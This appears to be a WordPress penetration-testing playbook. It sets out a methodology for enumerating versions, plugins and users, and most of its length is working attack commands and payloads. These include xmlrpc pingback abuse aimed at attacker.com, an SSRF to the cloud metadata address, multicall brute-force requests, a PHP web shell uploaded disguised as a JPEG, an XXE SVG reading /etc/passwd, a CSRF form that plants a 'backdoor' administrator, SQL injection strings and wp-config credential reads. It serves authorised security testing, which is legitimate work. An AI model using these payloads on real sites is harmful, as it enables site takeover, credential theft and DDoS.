<wordpress_security_guide>
<title>WORDPRESS SECURITY TESTING</title>

<critical>WordPress powers over 40% of websites, making it a prime target. Testing must cover plugin/theme vulnerabilities, xmlrpc.php attacks, wp-json REST API exploitation, user enumeration, wp-config.php exposure, upload directory exploitation, and admin panel security.</critical>

<scope>
- WordPress core version detection and known CVEs
- Plugin vulnerability testing (outdated, vulnerable plugins)
- Theme security issues
- xmlrpc.php attacks (pingback DDoS, brute force amplification)
- wp-json REST API exploitation
- User enumeration techniques
- wp-config.php exposure
- Upload directory traversal and exploitation
- Admin panel attacks
- Database exposure
</scope>

<methodology>
1. Fingerprint WordPress version and identify outdated core.
2. Enumerate plugins and themes, check for vulnerabilities.
3. Test xmlrpc.php for attacks (pingback, brute force).
4. Exploit wp-json REST API endpoints.
5. Enumerate users via multiple techniques.
6. Search for wp-config.php exposure.
7. Test file upload restrictions and directory access.
8. Attempt admin panel authentication bypass.
</methodology>

<version_detection>
{% raw %}
# WordPress version detection:

# Meta generator tag:
curl -s https://example.com/ | grep -i 'generator.*wordpress'
# <meta name="generator" content="WordPress 5.8.1" />

# readme.html file:
curl https://example.com/readme.html
# Version listed at top

# RSS feed:
curl https://example.com/feed/
# <generator>https://wordpress.org/?v=5.8.1</generator>

# REST API:
curl https://example.com/wp-json/
# Look for "version" in response

# Specific files by version:
# Version 5.9+: /wp-includes/js/dist/vendor/wp-polyfill.min.js
# Check file hashes against known versions

# WPScan:
wpscan --url https://example.com --enumerate vp,vt,u
{% endraw %}
</version_detection>

<plugin_enumeration>
{% raw %}
# Plugin enumeration:

# Passive (from HTML):
curl -s https://example.com/ | grep -oP 'wp-content/plugins/\K[^/]+'  | sort -u

# Active enumeration:
# Common plugin paths:
for plugin in $(cat common-plugins.txt); do
  curl -I "https://example.com/wp-content/plugins/$plugin/" 2>/dev/null | grep -q "200 OK" && echo "Found: $plugin"
done

# Plugin version detection:
curl https://example.com/wp-content/plugins/plugin-name/readme.txt
# Look for "Stable tag:" line

# REST API plugin enumeration:
curl https://example.com/wp-json/wp/v2/plugins
# May require authentication

# Common vulnerable plugins:
# - Contact Form 7 (file upload bypass)
# - Yoast SEO (XSS in older versions)
# - WooCommerce (various issues)
# - Elementor (XSS, privilege escalation)
# - wpDiscuz (arbitrary file upload)

# Check against WPVulnDB:
# https://wpscan.com/plugins/[plugin-slug]
{% endraw %}
</plugin_enumeration>

<theme_enumeration>
{% raw %}
# Theme detection:

# Passive (from HTML):
curl -s https://example.com/ | grep -oP 'wp-content/themes/\K[^/]+'  | sort -u

# Active:
curl -I https://example.com/wp-content/themes/twentytwentyone/
curl -I https://example.com/wp-content/themes/astra/

# Theme version:
curl https://example.com/wp-content/themes/theme-name/style.css
# Look for "Version:" line

# Common theme issues:
# - Arbitrary file upload
# - SQL injection in custom code
# - XSS in custom fields
# - Hardcoded credentials
# - Exposed backup files
{% endraw %}
</theme_enumeration>

<xmlrpc_attacks>
{% raw %}
# xmlrpc.php testing:

# Check if enabled:
curl -I https://example.com/xmlrpc.php
# 200 OK = enabled

# List methods:
curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Pingback DDoS:
# Abuse pingback to DDoS third-party:
curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/post</string></value></param><param><value><string>http://target.com/</string></value></param></params></methodCall>'

# SSRF via pingback:
curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.com/post</string></value></param><param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param></params></methodCall>'

# Brute force amplification:
# Single request tests multiple credentials:
curl -X POST https://example.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>password1</string></value></data></array></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>password2</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>'
{% endraw %}
</xmlrpc_attacks>

<rest_api_exploitation>
{% raw %}
# wp-json REST API testing:

# Discover endpoints:
curl https://example.com/wp-json/

# User enumeration:
curl https://example.com/wp-json/wp/v2/users

# Post enumeration:
curl https://example.com/wp-json/wp/v2/posts
curl https://example.com/wp-json/wp/v2/pages

# Media files:
curl https://example.com/wp-json/wp/v2/media

# Unauthenticated post creation (pre-4.7.2):
curl -X POST https://example.com/wp-json/wp/v2/posts -d '{"title":"Hacked","content":"Defaced","status":"publish"}' -H "Content-Type: application/json"

# Privilege escalation (CVE-2019-17671):
# Modify user roles via REST API
curl -X POST https://example.com/wp-json/wp/v2/users/1 -d '{"roles":["administrator"]}' -H "Content-Type: application/json" -H "Authorization: Bearer [token]"

# Custom endpoints from plugins:
curl https://example.com/wp-json/myplugin/v1/
# Test for authentication bypass, injection

# REST API IDOR:
curl https://example.com/wp-json/wp/v2/users/1
curl https://example.com/wp-json/wp/v2/users/2
# Access other users' data
{% endraw %}
</rest_api_exploitation>

<user_enumeration>
{% raw %}
# WordPress user enumeration:

# Method 1: Author archives
curl https://example.com/?author=1
# Redirects to: https://example.com/author/admin/
# Username: admin

# Loop through IDs:
for i in {1..10}; do
  curl -s -I https://example.com/?author=$i | grep -i location
done

# Method 2: Login error messages
curl -X POST https://example.com/wp-login.php -d "log=admin&pwd=wrong"
# Error: "The password you entered for the username admin is incorrect"
# Confirms username exists

curl -X POST https://example.com/wp-login.php -d "log=nonexistent&pwd=wrong"
# Error: "Unknown username. Check again or try your email address."

# Method 3: REST API
curl https://example.com/wp-json/wp/v2/users
# Returns all users with id, name, slug

# Method 4: RSS/Atom feeds
curl https://example.com/feed/
# Look for <dc:creator> tags

# Method 5: Oembed
curl https://example.com/wp-json/oembed/1.0/embed?url=https://example.com/?author=1
# Returns author name in response
{% endraw %}
</user_enumeration>

<wp_config_exposure>
{% raw %}
# wp-config.php exposure testing:

# Direct access (should be blocked):
curl https://example.com/wp-config.php
curl https://example.com/wp-config.php.bak
curl https://example.com/wp-config.old
curl https://example.com/wp-config.txt

# Backup files:
curl https://example.com/wp-config.php~
curl https://example.com/wp-config.php.swp
curl https://example.com/.wp-config.php.swp
curl https://example.com/wp-config.php.save

# Path traversal:
curl https://example.com/wp-admin/setup-config.php?step=1
# May reveal wp-config.php path

# Through vulnerable plugin LFI:
curl https://example.com/wp-content/plugins/vulnerable-plugin/download.php?file=../../../../wp-config.php

# Contains database credentials:
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wp_user');
# define('DB_PASSWORD', 'secret_password');
# define('DB_HOST', 'localhost');
# Auth keys and salts
{% endraw %}
</wp_config_exposure>

<upload_exploitation>
{% raw %}
# Upload directory exploitation:

# Directory listing:
curl https://example.com/wp-content/uploads/
# Should return 403 Forbidden, not directory listing

# Arbitrary file upload via plugin:
# Upload PHP file with image extension:
POST /wp-content/plugins/vulnerable/upload.php
Content-Type: multipart/form-data

file: shell.php.jpg
Content: <?php system($_GET['cmd']); ?>

# Access uploaded file:
curl https://example.com/wp-content/uploads/2024/01/shell.php.jpg?cmd=id

# .htaccess upload:
# Upload .htaccess to make .jpg executable:
AddType application/x-httpd-php .jpg

# Path traversal in upload:
filename: ../../../../var/www/html/shell.php

# Media library XXE:
# Upload malicious XML/SVG:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<text>&xxe;</text>
</svg>
{% endraw %}
</upload_exploitation>

<admin_panel_attacks>
{% raw %}
# Admin panel security testing:

# Default credentials:
admin:admin
admin:password
admin:wordpress

# Brute force:
wpscan --url https://example.com --passwords passwords.txt --usernames admin

# Using xmlrpc.php for brute force (faster):
# system.multicall method allows multiple attempts in one request

# SQL injection in admin:
# Search for vulnerable plugins used in admin panel
# Custom queries in theme/plugin admin pages

# Privilege escalation:
# User with editor role attempts to access admin functions
# Test plugin-specific capabilities

# CSRF to add admin user:
<form action="https://example.com/wp-admin/user-new.php" method="POST">
  <input name="action" value="createuser">
  <input name="user_login" value="backdoor">
  <input name="email" value="backdoor@evil.com">
  <input name="pass1" value="Password123!">
  <input name="pass2" value="Password123!">
  <input name="role" value="administrator">
</form>
<script>document.forms[0].submit();</script>
{% endraw %}
</admin_panel_attacks>

<database_access>
{% raw %}
# Database exposure testing:

# phpMyAdmin detection:
curl -I https://example.com/phpmyadmin/
curl -I https://example.com/pma/
curl -I https://example.com/mysql/

# SQL dumps in web root:
curl https://example.com/backup.sql
curl https://example.com/database.sql
curl https://example.com/wp-content/backup-db.sql

# SQL injection in plugins:
# Check plugin parameters:
GET /wp-content/plugins/vulnerable/ajax.php?id=1' OR '1'='1

# Direct database access via SSH/credentials:
# If wp-config.php exposed, use DB credentials
mysql -h localhost -u wp_user -p'secret_password' wordpress
{% endraw %}
</database_access>

<common_payloads>
{% raw %}
# User enumeration:
/?author=1
/wp-json/wp/v2/users

# xmlrpc brute force:
system.multicall with multiple credentials

# File upload:
shell.php.jpg with PHP code
.htaccess to execute .jpg files

# REST API unauthorized access:
/wp-json/wp/v2/posts
/wp-json/wp/v2/users/1

# Path traversal:
../../../../wp-config.php
../../../etc/passwd

# Admin CSRF:
Create admin user via CSRF

# SQL injection:
' OR '1'='1--
' UNION SELECT user,pass FROM wp_users--
{% endraw %}
</common_payloads>

<validation>
1. Demonstrate WordPress version detection and known CVE applicability.
2. Show vulnerable plugin/theme with proof-of-concept exploit.
3. Prove xmlrpc.php abuse (pingback SSRF, brute force amplification).
4. Document REST API unauthorized access or IDOR.
5. Show wp-config.php exposure with database credentials.
6. Demonstrate arbitrary file upload and code execution.
7. Prove user enumeration via multiple methods.
</validation>

<false_positives>
- Updated WordPress core (latest version)
- All plugins and themes updated
- xmlrpc.php disabled
- REST API properly authenticated and rate-limited
- Strong admin passwords with 2FA
- File upload restrictions enforced
- wp-config.php properly protected
- User enumeration mitigated (same error messages, disabled author pages)
</false_positives>

<impact>
- Complete site takeover via vulnerable plugins
- Mass DDoS using pingback amplification
- Brute force attacks via xmlrpc.php
- User data exposure via REST API
- Database compromise via wp-config.php exposure
- Remote Code Execution via file upload
- Admin account creation via CSRF
- SEO spam and defacement
</impact>

<pro_tips>
1. Always check WordPress core, plugin, and theme versions.
2. Test xmlrpc.php first - often enabled and exploitable.
3. REST API user enumeration is the easiest method.
4. Search for wp-config.php backups and variations.
5. Test upload functionality in all plugins.
6. Look for SQL injection in plugin admin pages.
7. CSRF is common in admin functionality.
8. Check WPScan vulnerability database for known issues.
9. Test both authenticated and unauthenticated REST API endpoints.
10. Don't forget database backup files in web root.
</pro_tips>

<remember>WordPress security depends on: updated core/plugins/themes, disabled xmlrpc.php, protected wp-config.php, secure file uploads, and proper authentication. Most critical: vulnerable plugins (check WPScan DB), xmlrpc.php abuse (pingback SSRF, brute force amplification), REST API user enumeration, wp-config.php exposure (database credentials). Common entry points: outdated plugins, file upload in media/forms, SQL injection in plugin parameters. Always enumerate plugins/themes first, then check for known vulnerabilities.</remember>
</wordpress_security_guide>
